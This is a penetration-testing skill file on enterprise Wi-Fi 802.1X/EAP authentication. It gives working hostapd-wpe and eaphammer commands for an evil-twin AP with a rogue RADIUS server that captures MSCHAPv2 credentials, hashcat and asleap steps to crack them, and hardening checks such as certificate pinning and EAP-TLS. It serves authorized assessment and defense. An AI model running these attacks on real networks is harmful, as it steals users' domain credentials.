---
name: testing-8021x-eap-wireless-authentication
description: Test enterprise Wi-Fi (WPA2/WPA3-Enterprise) 802.1X/EAP authentication for credential-theft exposure using rogue RADIUS and evil-twin attacks against PEAP and EAP-TTLS MSCHAPv2, crack captured MSCHAPv2 challenge/response, and validate hardening such as server-certificate validation and a migration to EAP-TLS.
domain: cybersecurity
subdomain: wireless-security
tags:
- wireless-security
- 802-1x
- eap
- peap
- mschapv2
- rogue-radius
- eap-tls
- enterprise-wifi
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- PR.AA-03
- PR.AA-01
- DE.CM-01
- ID.RA-01
mitre_attack:
- T1557
- T1556
- T1078
- T1110
---
# Testing 802.1X/EAP Wireless Authentication

> **Authorized Use Only:** Standing up a rogue RADIUS server or an enterprise evil twin captures the domain credentials of every user who connects, which can compromise an entire organization. Run these techniques only against networks, users, and devices you own or are explicitly authorized in writing to assess, capture only what the engagement scope permits, and store any harvested credential material under the same controls as the production secrets it represents.

## Overview

Enterprise Wi-Fi (WPA2/WPA3-Enterprise) replaces a shared passphrase with **802.1X** port-based authentication, where each client (supplicant) authenticates to a **RADIUS** server (authentication server) through the AP (authenticator) using an **EAP** method. The two methods dominating real deployments — **PEAP** and **EAP-TTLS** — wrap an inner **MSCHAPv2** exchange inside a TLS tunnel. The security of that tunnel depends entirely on the supplicant **validating the RADIUS server's certificate** and pinning the expected CA/hostname. When clients are misconfigured to skip certificate validation (extremely common, especially on BYOD), an attacker can stand up a **rogue RADIUS server behind an evil-twin AP**, the supplicant happily completes the inner MSCHAPv2 handshake against the attacker, and the attacker captures the username and the MSCHAPv2 challenge/response. This is **Adversary-in-the-Middle (T1557)** that **Modifies the Authentication Process (T1556)** by impersonating the trusted authenticator.

The captured MSCHAPv2 response is then cracked offline. MSCHAPv2 derives its three DES keys from the NT hash of the user's password, and the third DES key has only 2 bytes of entropy — so the challenge/response is reducible to a single DES key-search (the classic `chapcrack`/`asleap` result) or simply dictionary-cracked with **hashcat -m 5500**. A recovered domain password is a **Valid Account (T1078)** and the cracking step is **Brute Force (T1110)**. The reference offensive tooling is **hostapd-wpe** (the "Wireless Pwnage Edition" of hostapd) and **eaphammer**, which automate the rogue-AP + rogue-RADIUS + credential-capture chain, including the EAP "relay"/downgrade where the attacker negotiates the weakest mutually supported EAP method.

The durable defenses are method- and configuration-level: enforce **server-certificate validation with a pinned private CA and explicit server name** on every supplicant (via GPO/MDM), prefer **EAP-TLS** (mutual certificate authentication with no crackable password to capture), and where MSCHAPv2 must remain, restrict trusted root CAs and require Protected Management Frames. This skill reproduces the rogue-RADIUS credential-theft chain in a lab, measures the crackability of what is captured, and validates that certificate enforcement and/or EAP-TLS close the gap — mapping to NIST CSF PR.AA-03 (authentication) and PR.AA-01 (credential management).

## When to Use

- When assessing a WPA2/WPA3-Enterprise network that uses PEAP or EAP-TTLS with MSCHAPv2.
- When verifying whether managed and BYOD supplicants enforce RADIUS server-certificate validation.
- When building the business case to migrate from PEAP-MSCHAPv2 to EAP-TLS.
- When red-teaming an enterprise to demonstrate domain-credential capture from Wi-Fi.
- When validating a NAC/MDM profile actually pins the CA and server name on endpoints.
- When triaging incidents involving credential theft suspected to originate at the wireless edge.

## Prerequisites

- Linux host (Kali/Parrot/Ubuntu) and a Wi-Fi adapter supporting **AP/master mode + injection** (e.g. Alfa AWUS036ACM/ACH).
- Offensive tooling:
  ```bash
  sudo apt update
  sudo apt install -y hostapd-wpe eaphammer freeradius hashcat asleap
  # eaphammer (if not packaged):
  git clone https://github.com/s0lst1c3/eaphammer.git && cd eaphammer && ./kali-setup
  ```
- A self-signed/lab RADIUS certificate for the rogue server (hostapd-wpe ships a default set for testing).
- A test enterprise SSID, at least one test supplicant, and a wordlist for cracking (e.g. `rockyou.txt`).
- Written authorization scoping the users/devices in range.

## Objectives

- Enumerate the EAP method(s) and server-certificate posture a target enterprise SSID requires.
- Stand up a rogue RADIUS + evil-twin AP and capture inner MSCHAPv2 credentials from a misconfigured supplicant.
- Convert captured challenge/response to a hashcat -m 5500 job and measure crackability.
- Identify EAP method weaknesses (PEAP/TTLS-MSCHAPv2 vs EAP-TLS) and downgrade exposure.
- Validate hardening: server-certificate validation/pinning and EAP-TLS migration.
- Produce a per-SSID findings report mapping captured credentials to remediation.

## MITRE ATT&CK Mapping

| ID | Name | Tactic | Where it shows up |
|----|------|--------|-------------------|
| T1557 | Adversary-in-the-Middle | Credential Access / Collection | Evil-twin AP + rogue RADIUS positioned between supplicant and real server |
| T1556 | Modify Authentication Process | Credential Access / Defense Evasion | Impersonating the trusted RADIUS authenticator to harvest the inner handshake |
| T1078 | Valid Accounts | Initial Access / Privilege Escalation | A cracked MSCHAPv2 password yields working domain credentials |
| T1110 | Brute Force | Credential Access | Offline dictionary/DES cracking of the captured MSCHAPv2 response |

## Workflow

### 1. Enumerate the enterprise SSID and EAP posture
Identify that the target is 802.1X (WPA-Enterprise, AKM 00-0F-AC:1 / :5) and observe the EAP method offered. EAP types appear in the EAP-Request/Identity and method-negotiation frames.

```bash
sudo airmon-ng start wlan0
sudo airodump-ng -c 36 --bssid AA:BB:CC:DD:EE:FF -w ent wlan0mon
# Inspect EAP method negotiation in the capture
tshark -r ent-01.cap -Y "eap" \
  -T fields -e eap.identity -e eap.type -e eaol.type | sort -u
# eap.type 25 = PEAP, 21 = EAP-TTLS, 13 = EAP-TLS, 26 = MSCHAPv2 (inner)
```

### 2. Stand up rogue RADIUS + evil-twin AP (hostapd-wpe)
hostapd-wpe runs an AP that speaks 802.1X and acts as its own malicious RADIUS endpoint, completing PEAP/TTLS and logging the inner MSCHAPv2 username, challenge, and response from any supplicant that connects without validating the certificate.

```bash
cat > wpe.conf <<'EOF'
interface=wlan1
driver=nl80211
ssid=CorpSecure
hw_mode=g
channel=6
wpa=2
wpa_key_mgmt=WPA-EAP
rsn_pairwise=CCMP
ieee8021x=1
eap_server=1
eap_user_file=hostapd-wpe.eap_user
ca_cert=ca.pem
server_cert=server.pem
private_key=server.key
EOF
sudo hostapd-wpe wpe.conf
# Captured credentials are printed and appended to hostapd-wpe.log / .creds
```

### 3. Or use eaphammer for the automated capture chain
eaphammer wraps certificate generation, the evil-twin, and credential capture, and supports the GTC downgrade and "hostile portal" follow-on.

```bash
# Generate a realistic-looking certificate, then run the credential-theft AP
./eaphammer --cert-wizard
sudo ./eaphammer -i wlan1 --channel 6 --auth wpa-eap \
     --essid CorpSecure --creds
# Captured: username + MSCHAPv2 challenge/response, written to loot/
```

### 4. Convert and crack the captured MSCHAPv2 exchange
Turn the logged username/challenge/response into a hashcat -m 5500 (NetNTLMv1 / MSCHAPv2) job, or use asleap. Crackability depends on password strength; success demonstrates real impact.

```bash
# hostapd-wpe logs the hash in netntlm/asleap form, e.g.:
#   username::::<response>:<challenge>
hashcat -m 5500 captured_mschapv2.hash rockyou.txt -r rules/best64.rule
# asleap path (challenge/response + wordlist):
asleap -C <8-byte-challenge> -R <24-byte-response> -W rockyou.txt
```

### 5. Classify EAP method weakness and downgrade exposure
Score what was observed: PEAP/TTLS-MSCHAPv2 without certificate validation is the high-risk case; an EAP method downgrade to GTC (cleartext inner password) is worse; EAP-TLS with mutual certs has no crackable secret to capture.

```bash
python3 scripts/agent.py analyze --log hostapd-wpe.log --json eap-findings.json
# Reports: EAP method, cert-validation observed?, downgrade?, crackability estimate
```

### 6. Validate hardening (cert pinning + EAP-TLS) and re-test
Re-run steps 2-4 after enforcing supplicant certificate validation (pinned private CA + server name) and/or migrating to EAP-TLS. A correctly configured supplicant refuses the rogue RADIUS because the certificate fails validation, so nothing is captured.

```bash
# Audit a wpa_supplicant client profile for cert enforcement:
python3 scripts/agent.py audit-supplicant --conf /etc/wpa_supplicant/wpa_supplicant.conf
# A hardened PEAP profile must set:
#   ca_cert="/etc/ssl/certs/corp-ca.pem"
#   domain_suffix_match="radius.corp.example.com"
#   phase1="peaplabel=0"   (and ideally migrate eap=TLS with client_cert/private_key)
```

## Tools and Resources

| Resource | Link |
|----------|------|
| hostapd-wpe | https://github.com/aircrack-ng/hostapd-wpe |
| eaphammer | https://github.com/s0lst1c3/eaphammer |
| asleap | https://github.com/joswr1ght/asleap |
| hashcat (mode 5500) | https://hashcat.net/hashcat/ |
| FreeRADIUS | https://www.freeradius.org/ |
| chapcrack (MSCHAPv2 → DES) | https://github.com/moxie0/chapcrack |
| NIST SP 800-153 — Securing WLANs | https://csrc.nist.gov/pubs/sp/800/153/final |
| Wi-Fi Alliance WPA3-Enterprise | https://www.wi-fi.org/discover-wi-fi/security |

## EAP Method Risk Cheat-Sheet

| EAP method | Inner auth | Crackable secret? | Risk without cert validation | Recommendation |
|------------|-----------|-------------------|------------------------------|----------------|
| PEAP-MSCHAPv2 | MSCHAPv2 | NT hash (DES-reducible) | HIGH — full credential theft | Pin CA + server name; prefer EAP-TLS |
| EAP-TTLS-MSCHAPv2 | MSCHAPv2/PAP | MSCHAPv2 (or cleartext PAP!) | HIGH/CRITICAL | Disable PAP inner; pin CA; EAP-TLS |
| EAP-PEAP-GTC | GTC (cleartext) | cleartext password | CRITICAL | Disable GTC over rogue; EAP-TLS |
| EAP-FAST | MSCHAPv2 in PAC tunnel | MSCHAPv2 | MEDIUM-HIGH | Provision PAC securely; EAP-TLS |
| EAP-TLS | mutual certificate | none (no password) | LOW | Target state |

## Validation Criteria

- [ ] Enterprise SSID confirmed as 802.1X and EAP method(s) enumerated.
- [ ] Rogue RADIUS + evil-twin stood up and credential capture demonstrated on a misconfigured supplicant.
- [ ] Captured MSCHAPv2 converted to hashcat -m 5500 and crackability measured.
- [ ] EAP method weakness and any downgrade (GTC/PAP) classified.
- [ ] Supplicant profiles audited for ca_cert + domain_suffix_match enforcement.
- [ ] Hardened config (cert pinning and/or EAP-TLS) re-tested — rogue capture fails.
- [ ] Per-SSID findings and remediation documented; captured material handled as production secrets.
